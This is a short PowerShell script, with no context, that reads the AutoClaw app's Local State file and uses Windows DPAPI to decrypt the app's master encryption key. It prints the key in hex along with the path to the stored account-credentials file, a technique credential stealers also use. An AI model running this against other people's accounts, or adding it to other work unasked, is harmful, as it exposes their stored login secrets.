$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Security
$ls = Get-Content "$env:APPDATA\AutoClaw\Local State" -Raw | ConvertFrom-Json
$raw = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
$key = [Security.Cryptography.ProtectedData]::Unprotect($raw[5..($raw.Length-1)], $null, 'CurrentUser')
$hex = ($key | ForEach-Object { $_.ToString('x2') }) -join ''
$accDir = Get-ChildItem "$env:APPDATA\AutoClaw\accounts" -Directory | Where-Object Name -match '^[a-f0-9]{64}$' | Select-Object -First 1
Write-Output $hex
Write-Output ($accDir.FullName + '\account-credentials.enc')
